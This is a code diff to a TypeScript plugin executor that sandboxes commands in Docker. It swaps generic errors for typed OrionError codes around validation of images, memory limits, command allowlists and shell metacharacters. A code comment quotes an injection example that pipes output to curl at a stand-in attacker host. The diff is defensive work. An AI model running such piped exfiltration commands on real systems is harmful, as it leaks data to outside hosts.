@@ -734,12 +734,12 @@ export class PluginExecutorService {
     try {
       await this.pullImageIfNeeded(containerImage, pullPolicy);
     } catch (error: any) {
-      throw new Error(`Image pull failed for ${containerImage}: ${error.message}`);
+      throw new OrionError('OPERATION_FAILED', `Image pull failed for ${containerImage}: ${error.message}`)
     }
 
     // Sanitize memory limit to prevent injection
     if (!/^\d+[mkg]$/i.test(memoryLimit)) {
-      throw new Error(`Invalid memory limit: ${memoryLimit}`);
+      throw new OrionError('VALIDATION_ERROR', `Invalid memory limit: ${memoryLimit}`)
     }
 
     // Create container using spawn with arg arrays (no shell injection)
@@ -760,7 +760,7 @@ export class PluginExecutorService {
       await this.spawnDocker(dockerArgs, signal);
       containerCreated = true;
     } catch (error) {
-      throw new Error(`Failed to create container: ${error instanceof Error ? error.message : String(error)}`);
+      throw new OrionError('OPERATION_FAILED', `Failed to create container: ${error instanceof Error ? error.message : String(error)}`)
     }
 
     // Register with ProcessKiller for container lifecycle management
@@ -816,11 +816,11 @@ export class PluginExecutorService {
     // Allow digest format: name@sha256:xxxx
     const validImageRegex = /^(?:[a-zA-Z0-9](?:[a-zA-Z0-9._-]*[a-zA-Z0-9])?(?::\d+)?\/)?[a-z0-9]+(?:[._-][a-z0-9]+)*(?:\/[a-z0-9]+(?:[._-][a-z0-9]+)*)*(?::[a-zA-Z0-9._-]+)?(?:@[a-zA-Z0-9._-]+)?$/;
     if (!validImageRegex.test(image)) {
-      throw new Error(`Invalid Docker image name: ${image}`);
+      throw new OrionError('VALIDATION_ERROR', `Invalid Docker image name: ${image}`)
     }
     // Block path traversal attempts
     if (image.includes('..') || image.includes('\0')) {
-      throw new Error(`Invalid Docker image name: ${image}`);
+      throw new OrionError('VALIDATION_ERROR', `Invalid Docker image name: ${image}`)
     }
     return image;
   }
@@ -997,7 +997,7 @@ export class PluginExecutorService {
 
     for (const pattern of dangerousPatterns) {
       if (pattern.test(command)) {
-        throw new Error(`Command contains dangerous pattern: ${pattern.source}`);
+        throw new OrionError('OPERATION_FAILED', `Command contains dangerous pattern: ${pattern.source}`)
       }
     }
 
@@ -1013,7 +1013,7 @@ export class PluginExecutorService {
     // Check command against allowlist
     const cmdBase = parts[0].toLowerCase();
     if (this.allowedCommands.size > 0 && !this.allowedCommands.has(cmdBase)) {
-      throw new Error(`Command '${cmdBase}' is not in the allowed commands list`);
+      throw new OrionError('OPERATION_FAILED', `Command '${cmdBase}' is not in the allowed commands list`)
     }
 
     // If the command is a simple executable (no shell metacharacters), run without shell
@@ -1027,10 +1027,7 @@ export class PluginExecutorService {
     // commands like "ls | curl http://evil.com" would pass because "ls" is
     // allowed while the injection executes after the pipe.  We cannot safely
     // sanitize arbitrary shell syntax, so we reject it outright.
-    throw new Error(
-      `Command contains shell metacharacters which are not allowed. ` +
-      `Use a simple command with arguments only (no ;|&$<>()!#).`
-    );
+    throw new OrionError(ErrorCode.OPERATION_FAILED, 'Plugin execution failed');
   }
 
   /**
